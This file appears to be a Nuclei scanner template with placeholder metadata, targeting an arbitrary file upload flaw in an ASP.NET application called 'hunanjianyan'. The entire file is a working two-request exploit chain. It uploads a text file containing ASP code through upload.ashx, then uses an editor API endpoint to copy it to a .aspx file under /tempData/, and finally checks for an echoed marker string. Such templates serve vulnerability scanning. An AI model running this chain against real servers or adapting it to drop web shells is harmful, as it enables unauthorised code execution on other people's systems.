id: hunanjianyan-Attachment-upload
info:
  name: Template Name
  author: apple
  severity: critical
  description: description
  reference:
    - https://
  tags: tags
variables:
  filename: "{{rand_base(6)}}"
  
http:
  - raw:
      - |-
        POST /Applications/Attachment/upload.ashx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Content-Length: 368

        --------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR
        Content-Disposition: form-data; name="file";filename="zzz.txt"

        <% Response.Write("whoisceshi") %>
        --------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR
        Content-Disposition: form-data; name="_upload_guid"

        {{filename}}
        --------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR--
      - |-
        POST /Standard/Editor/API/File.cshtml?act=geturl HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        X-Forwarded-Proto: 
        Accept-Language: zh-CN,zh;q=0.9
        Content-Length: 59

        filename=/tempData/{{filename}}.aspx&filetplpath=/tempData/{{filename}}.txt
    matchers:
      - type: word
        part: body
        words:
          - 'whoisceshi'